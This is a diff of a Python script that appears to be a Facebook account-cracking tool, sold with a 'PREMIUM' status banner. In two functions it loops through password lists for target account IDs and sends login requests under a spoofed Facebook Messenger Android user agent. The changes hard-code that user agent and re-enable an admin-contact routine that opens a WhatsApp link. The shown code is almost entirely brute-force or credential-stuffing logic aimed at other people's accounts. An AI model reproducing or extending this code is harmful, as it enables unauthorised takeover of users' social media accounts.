@@ -234,7 +234,7 @@ logo=("""\033[38;5;33m
 \033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
 \033[38;5;196m────────────────────────────────────────────""")
 def shuvo_M():
-      ##  clear()
+        clear()
         print(f'{GR}[{G}1{GR}] {W}COUNTINUE {W} ')
         print(f'{GR}[{G}2{GR}] {W}CALL ADMIN{W}')
         print(f'{GR}[{G}0{GR}] {W}EXIT{W}');linex()
@@ -377,7 +377,7 @@ def _M2_(ids,pasx):
         sys.stdout.flush()
         try:
                 for ps in pasx:
-                        ua_string=userag1()
+                        ua_string="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                         session = requests.Session()
                         data={
 'adid': str(uuid.uuid4()),
@@ -441,7 +441,7 @@ def _M3_(ids,pasb):
         try:
                 for ps in pasb:
                         session = requests.Session()
-                        user_agent=userag1()
+                        user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                         data={
                         'adid': str(uuid.uuid4()),
                         'format': 'json',
@@ -725,4 +725,4 @@ def superuser():
         os.system('xdg-open https://wa.me/+918389066877?text=' + tks)
         superuser()   
 shuvo_M()
-#superuser()
+superuser()
